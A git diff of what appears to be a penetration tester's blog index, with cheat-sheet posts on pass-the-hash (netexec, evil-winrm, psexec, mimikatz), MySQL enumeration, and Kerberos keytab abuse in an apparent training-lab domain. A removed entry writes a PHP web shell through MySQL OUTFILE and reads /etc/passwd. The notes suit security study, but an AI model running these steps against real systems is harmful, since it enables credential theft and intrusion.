-    <content><![CDATA[<h1 id="NetExec"><a href="#NetExec" class="headerlink" title="NetExec"></a>NetExec</h1><h3 id="Domain-Account"><a href="#Domain-Account" class="headerlink" title="Domain Account"></a>Domain Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -d Domain -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Local-Account"><a href="#Local-Account" class="headerlink" title="Local Account"></a>Local Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -H <span class="built_in">hash</span> --local-auth</span><br></pre></td></tr></table></figure>
-
-<h3 id="Command-Execution"><a href="#Command-Execution" class="headerlink" title="Command Execution"></a>Command Execution</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -H <span class="built_in">hash</span>  -x <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="evil-winrm"><a href="#evil-winrm" class="headerlink" title="evil-winrm"></a>evil-winrm</h1><h3 id="Local-Account-1"><a href="#Local-Account-1" class="headerlink" title="Local Account"></a>Local Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i ip -u username -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Domain-Account-1"><a href="#Domain-Account-1" class="headerlink" title="Domain Account"></a>Domain Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i ip -u username@domain -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-psexec username@ip -hashes :<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp  /v:ip /u:username /pth:<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Linux</category>
-        <category>Post Exploitation</category>
-        <category>Pass the Hash (PtH)</category>
-      </categories>
-      <tags>
-        <tag>netexec</tag>
-        <tag>evil-winrm</tag>
-        <tag>impacket-psexec</tag>
-        <tag>xfreerdp</tag>
       </tags>
   </entry>
   <entry>
@@ -427,43 +396,117 @@
       </tags>
   </entry>
   <entry>
-    <title>MySQL Exploitation</title>
-    <url>/2025/11/21/MySQL-Exploitation/</url>
-    <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
-<ul>
-<li><p>Only users with the <strong>FILE privilege</strong> can use <code>LOAD DATA</code>, <code>SELECT INTO OUTFILE</code>, or <code>LOAD_FILE()</code>.</p>
-</li>
-<li><p><strong>Settings: of Secure File Privileges</strong></p>
-<ul>
-<li><p><strong>Empty:</strong> No restriction (not secure).</p>
-</li>
-<li><p><strong>Directory path:</strong> Can only read&#x2F;write in that folder.</p>
-</li>
-<li><p><strong>NULL:</strong> File operations are disabled.</p>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="Example"><a href="#Example" class="headerlink" title="Example :"></a>Example :</h4><p>In the following example, the <code>secure_file_priv</code> variable is empty, which means MySQL can read and write files from <strong>any directory</strong> that the MySQL service account has permission to access.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure>
+    <title>Linux Pass the Hash (PtH)</title>
+    <url>/2025/11/27/Linux-Pass-the-Hash-PtH/</url>
+    <content><![CDATA[<h1 id="NetExec"><a href="#NetExec" class="headerlink" title="NetExec"></a>NetExec</h1><h3 id="Domain-Account"><a href="#Domain-Account" class="headerlink" title="Domain Account"></a>Domain Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -d Domain -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
 
 
-<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> LOAD_FILE(&quot;/etc/passwd&quot;);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> LOAD_FILE(&quot;/etc/passwd&quot;)</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:<span class="operator">/</span>usr<span class="operator">/</span>sbin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:<span class="operator">/</span>bin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:<span class="operator">/</span>dev:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:<span class="operator">/</span>bin:<span class="operator">/</span>bin<span class="operator">/</span>sync</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>SNIP<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="Local-Account"><a href="#Local-Account" class="headerlink" title="Local Account"></a>Local Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -H <span class="built_in">hash</span> --local-auth</span><br></pre></td></tr></table></figure>
+
+<h3 id="Command-Execution"><a href="#Command-Execution" class="headerlink" title="Command Execution"></a>Command Execution</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -H <span class="built_in">hash</span>  -x <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="evil-winrm"><a href="#evil-winrm" class="headerlink" title="evil-winrm"></a>evil-winrm</h1><h3 id="Local-Account-1"><a href="#Local-Account-1" class="headerlink" title="Local Account"></a>Local Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i ip -u username -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Domain-Account-1"><a href="#Domain-Account-1" class="headerlink" title="Domain Account"></a>Domain Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i ip -u username@domain -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
 
 
-<h1 id="MySQL-Write-File"><a href="#MySQL-Write-File" class="headerlink" title="MySQL - Write File"></a>MySQL - Write File</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
+<h1 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-psexec username@ip -hashes :<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp  /v:ip /u:username /pth:<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Linux</category>
+        <category>Post Exploitation</category>
+        <category>Pass the Hash (PtH)</category>
+      </categories>
+      <tags>
+        <tag>netexec</tag>
+        <tag>evil-winrm</tag>
+        <tag>impacket-psexec</tag>
+        <tag>xfreerdp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL Enumeration</title>
+    <url>/2025/11/21/MySQL-Enumeration/</url>
+    <content><![CDATA[<h1 id="Connect-To-The-Server"><a href="#Connect-To-The-Server" class="headerlink" title="Connect To The Server"></a>Connect To The Server</h1><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u username -p&lt;password&gt; -h target</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Enumerate-Version"><a href="#Enumerate-Version" class="headerlink" title="Enumerate Version"></a>Enumerate Version</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@version</span>;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Enumerate-Database"><a href="#Enumerate-Database" class="headerlink" title="Enumerate Database"></a>Enumerate Database</h1><h3 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> DATABASES; </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> SCHEMA_NAME <span class="keyword">FROM</span> information_schema.SCHEMATA;</span><br></pre></td></tr></table></figure>
+<h3 id="Check-Current-Database"><a href="#Check-Current-Database" class="headerlink" title="Check Current Database"></a>Check Current Database</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DATABASE();</span><br></pre></td></tr></table></figure>
+
+<h3 id="List-tables-in-current-database"><a href="#List-tables-in-current-database" class="headerlink" title="List tables in current database"></a>List tables in current database</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> TABLES;  </span><br><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>DATABASE();  </span><br></pre></td></tr></table></figure>
+<h3 id="List-columns-in-specific-table"><a href="#List-columns-in-specific-table" class="headerlink" title="List columns in specific table"></a>List columns in specific table</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> COLUMNS <span class="keyword">FROM</span> table_name;  </span><br><span class="line"><span class="keyword">SELECT</span> column_name, data_type <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>;  </span><br></pre></td></tr></table></figure>
+<h3 id="Find-sensitive-columns"><a href="#Find-sensitive-columns" class="headerlink" title="Find sensitive columns"></a>Find sensitive columns</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name, column_name <span class="keyword">FROM</span> information_schema.COLUMNS  </span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%password%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%pass%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%pwd%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%secret%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%token%&#x27;</span>;  </span><br></pre></td></tr></table></figure>
+<h3 id="Count-rows-in-tables"><a href="#Count-rows-in-tables" class="headerlink" title="Count rows in tables"></a>Count rows in tables</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name, table_rows <span class="keyword">FROM</span> information_schema.TABLES  </span><br><span class="line"><span class="keyword">WHERE</span> table_schema <span class="operator">=</span> DATABASE();</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h1 id="Users-Enumeration"><a href="#Users-Enumeration" class="headerlink" title="Users Enumeration"></a>Users Enumeration</h1><h4 id="List-MySQL-users"><a href="#List-MySQL-users" class="headerlink" title="List MySQL users"></a>List MySQL users</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>, host <span class="keyword">FROM</span> mysql.user;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Check-Current-User"><a href="#Check-Current-User" class="headerlink" title="Check Current User"></a>Check Current User</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">USER</span>();  </span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_USER</span>();</span><br></pre></td></tr></table></figure>
+
+<h4 id="List-users-with-FILE-privilege"><a href="#List-users-with-FILE-privilege" class="headerlink" title="List users with FILE privilege"></a>List users with FILE privilege</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>, host <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> File_priv <span class="operator">=</span> <span class="string">&#x27;Y&#x27;</span>;  </span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> file_priv <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;current_user&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<h4 id="List-users-with-SUPER-privilege"><a href="#List-users-with-SUPER-privilege" class="headerlink" title="List users with SUPER privilege"></a>List users with SUPER privilege</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>, host <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> Super_priv <span class="operator">=</span> <span class="string">&#x27;Y&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
         <category>Active Directory</category>
-        <category>Service-Exploitation</category>
+        <category>Service-Enumeration</category>
         <category>MySQL</category>
       </categories>
       <tags>
+        <tag>Enumeration</tag>
         <tag>MySQL</tag>
-        <tag>Exploitation</tag>
-        <tag>MySQL-Read-Files</tag>
-        <tag>MySQL-Write-Files</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PTT : KeyTab File Abuse</title>
+    <url>/2025/11/29/PTT-KeyTab-File-Abuse/</url>
+    <content><![CDATA[<h1 id="Finding-Keytab-files"><a href="#Finding-Keytab-files" class="headerlink" title="Finding Keytab files"></a>Finding Keytab files</h1><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><p><code>➜ To use a keytab file, we must have read and write (rw) privileges on the file.</code></p>
+<p><code>➜ A Linux joined machine needs a ticket to interact with AD, this ticket is located on /etc/krb5.keytab and we can&#39;t read it without root permission.</code></p>
+<h4 id="Using-Find"><a href="#Using-Find" class="headerlink" title="Using Find"></a>Using Find</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name *keytab* -<span class="built_in">ls</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line">   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab</span><br><span class="line">   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab</span><br></pre></td></tr></table></figure>
+
+<h4 id="Identifying-Keytab-files-in-Cronjobs"><a href="#Identifying-Keytab-files-in-Cronjobs" class="headerlink" title="Identifying Keytab files in Cronjobs"></a>Identifying Keytab files in Cronjobs</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit this file to introduce tasks to be run by cron.</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">...SNIP...</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line">*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt</span><br><span class="line"></span><br><span class="line">smbclient //dc01.inlanefreight.htb/svc_workstations -c <span class="string">&#x27;ls&#x27;</span>  -k -no-pass &gt; /home/carlos@inlanefreight.htb/script-test-results.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="KeyTab-File-Abuse"><a href="#KeyTab-File-Abuse" class="headerlink" title="KeyTab File Abuse"></a>KeyTab File Abuse</h1><h2 id="Impersonating-User-With-KeyTab"><a href="#Impersonating-User-With-KeyTab" class="headerlink" title="Impersonating User With KeyTab"></a>Impersonating User With KeyTab</h2><h4 id="Listing-KeyTab-file-information"><a href="#Listing-KeyTab-file-information" class="headerlink" title="Listing KeyTab file information"></a>Listing KeyTab file information</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist -k -t /opt/specialfiles/carlos.keytab </span><br><span class="line"></span><br><span class="line">Keytab name: FILE:/opt/specialfiles/carlos.keytab</span><br><span class="line">KVNO Timestamp           Principal</span><br><span class="line">---- ------------------- ------------------------------------------------------</span><br><span class="line">   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>
+
+<h4 id="Impersonating-Target-User"><a href="#Impersonating-Target-User" class="headerlink" title="Impersonating Target User"></a>Impersonating Target User</h4><p><code>➜ Note: kinit is case-sensitive, so we must use the exact same principal name as shown in klist.</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist </span><br><span class="line"></span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu</span><br><span class="line">Default principal: carlos@INLANEFREIGHT.HTB</span><br><span class="line"></span><br><span class="line">Valid starting     Expires            Service principal</span><br><span class="line">10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 10/07/22 17:16:11</span><br></pre></td></tr></table></figure>
+
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>Connecting to SMB Share as Carlos</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //dc01/carlos -k -c <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">  .                                   D        0  Thu Oct  6 14:46:26 2022</span><br><span class="line">  ..                                  D        0  Thu Oct  6 14:46:26 2022</span><br><span class="line">  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022</span><br><span class="line"></span><br><span class="line">                7706623 blocks of size 4096. 4452852 blocks available</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Extract-NTLM-Hash-From-Keytab"><a href="#Extract-NTLM-Hash-From-Keytab" class="headerlink" title="Extract NTLM Hash From Keytab"></a>Extract NTLM Hash From Keytab</h2><h4 id="Extracting-KeyTab-hashes-with-KeyTabExtract"><a href="#Extracting-KeyTab-hashes-with-KeyTabExtract" class="headerlink" title="Extracting KeyTab hashes with KeyTabExtract"></a>Extracting KeyTab hashes with KeyTabExtract</h4><p> <a href="https://github.com/sosdave/KeyTabExtract">KeyTabExtract</a> will extract information such as the realm, Service Principal, Encryption Type, and Hashes.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab </span><br><span class="line"></span><br><span class="line">[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM <span class="built_in">hash</span>.</span><br><span class="line">[*] AES256-CTS-HMAC-SHA1 key found. Will attempt <span class="built_in">hash</span> extraction.</span><br><span class="line">[*] AES128-CTS-HMAC-SHA1 <span class="built_in">hash</span> discovered. Will attempt <span class="built_in">hash</span> extraction.</span><br><span class="line">[+] Keytab File successfully imported.</span><br><span class="line">        REALM : INLANEFREIGHT.HTB</span><br><span class="line">        SERVICE PRINCIPAL : carlos/</span><br><span class="line">        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60</span><br><span class="line">        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f</span><br><span class="line">        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4</span><br></pre></td></tr></table></figure>
+
+<p><code>➜ Then we can perform pass hash attack or crack the ntlm hash</code></p>
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Linux</category>
+        <category>Post Exploitation</category>
+        <category>Pass the Ticket (Ptt)</category>
+        <category>KeyTab Abuse</category>
+      </categories>
+      <tags>
+        <tag>klist</tag>
+        <tag>kinit</tag>
+        <tag>KeyTabExtract</tag>
       </tags>
   </entry>
   <entry>
@@ -624,75 +667,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MySQL Enumeration</title>
-    <url>/2025/11/21/MySQL-Enumeration/</url>
-    <content><![CDATA[<h1 id="Connect-To-The-Server"><a href="#Connect-To-The-Server" class="headerlink" title="Connect To The Server"></a>Connect To The Server</h1><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u username -p&lt;password&gt; -h target</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Enumerate-Version"><a href="#Enumerate-Version" class="headerlink" title="Enumerate Version"></a>Enumerate Version</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@version</span>;</span><br></pre></td></tr></table></figure>
-
-<h1 id="Enumerate-Database"><a href="#Enumerate-Database" class="headerlink" title="Enumerate Database"></a>Enumerate Database</h1><h3 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> DATABASES; </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> SCHEMA_NAME <span class="keyword">FROM</span> information_schema.SCHEMATA;</span><br></pre></td></tr></table></figure>
-<h3 id="Check-Current-Database"><a href="#Check-Current-Database" class="headerlink" title="Check Current Database"></a>Check Current Database</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DATABASE();</span><br></pre></td></tr></table></figure>
-
-<h3 id="List-tables-in-current-database"><a href="#List-tables-in-current-database" class="headerlink" title="List tables in current database"></a>List tables in current database</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> TABLES;  </span><br><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>DATABASE();  </span><br></pre></td></tr></table></figure>
-<h3 id="List-columns-in-specific-table"><a href="#List-columns-in-specific-table" class="headerlink" title="List columns in specific table"></a>List columns in specific table</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> COLUMNS <span class="keyword">FROM</span> table_name;  </span><br><span class="line"><span class="keyword">SELECT</span> column_name, data_type <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>;  </span><br></pre></td></tr></table></figure>
-<h3 id="Find-sensitive-columns"><a href="#Find-sensitive-columns" class="headerlink" title="Find sensitive columns"></a>Find sensitive columns</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name, column_name <span class="keyword">FROM</span> information_schema.COLUMNS  </span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%password%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%pass%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%pwd%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%secret%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%token%&#x27;</span>;  </span><br></pre></td></tr></table></figure>
-<h3 id="Count-rows-in-tables"><a href="#Count-rows-in-tables" class="headerlink" title="Count rows in tables"></a>Count rows in tables</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name, table_rows <span class="keyword">FROM</span> information_schema.TABLES  </span><br><span class="line"><span class="keyword">WHERE</span> table_schema <span class="operator">=</span> DATABASE();</span><br></pre></td></tr></table></figure>
-
-
-
-
-<h1 id="Users-Enumeration"><a href="#Users-Enumeration" class="headerlink" title="Users Enumeration"></a>Users Enumeration</h1><h4 id="List-MySQL-users"><a href="#List-MySQL-users" class="headerlink" title="List MySQL users"></a>List MySQL users</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>, host <span class="keyword">FROM</span> mysql.user;</span><br></pre></td></tr></table></figure>
-
-<h4 id="Check-Current-User"><a href="#Check-Current-User" class="headerlink" title="Check Current User"></a>Check Current User</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">USER</span>();  </span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_USER</span>();</span><br></pre></td></tr></table></figure>
-
-<h4 id="List-users-with-FILE-privilege"><a href="#List-users-with-FILE-privilege" class="headerlink" title="List users with FILE privilege"></a>List users with FILE privilege</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>, host <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> File_priv <span class="operator">=</span> <span class="string">&#x27;Y&#x27;</span>;  </span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> file_priv <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;current_user&#x27;</span>;</span><br></pre></td></tr></table></figure>
-<h4 id="List-users-with-SUPER-privilege"><a href="#List-users-with-SUPER-privilege" class="headerlink" title="List users with SUPER privilege"></a>List users with SUPER privilege</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>, host <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> Super_priv <span class="operator">=</span> <span class="string">&#x27;Y&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Service-Enumeration</category>
-        <category>MySQL</category>
-      </categories>
-      <tags>
-        <tag>Enumeration</tag>
-        <tag>MySQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows Pass the Hash (PtH)</title>
-    <url>/2025/11/27/Windows-Pass-the-Hash-PtH/</url>
-    <content><![CDATA[<h1 id="Mimikatz-local-administrator-privilege"><a href="#Mimikatz-local-administrator-privilege" class="headerlink" title="Mimikatz ( local administrator privilege  )"></a>Mimikatz ( local administrator privilege  )</h1><p>➜ This command will create a new CMD session using the permissions of the user we want to impersonate.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug <span class="string">&quot;sekurlsa::pth /user:username /NTLM:&lt;hash&gt; /domain:&lt;domain&gt; /run:cmd.exe&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-
-<p>➜ When impersonating a local account, the <code>/domain</code> parameter should be set to <code>localhost</code> or simply <code>.</code></p>
-<h1 id="PowerShell-Invoke-TheHash"><a href="#PowerShell-Invoke-TheHash" class="headerlink" title="PowerShell Invoke-TheHash"></a>PowerShell Invoke-TheHash</h1><p>➜ Since <a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a> uses <code>Invoke-SMBExec</code> and <code>Invoke-WMIExec</code> to authenticate and execute commands on the target, the NTLM hash used must belong to an <code>account with administrative rights</code> on the target.</p>
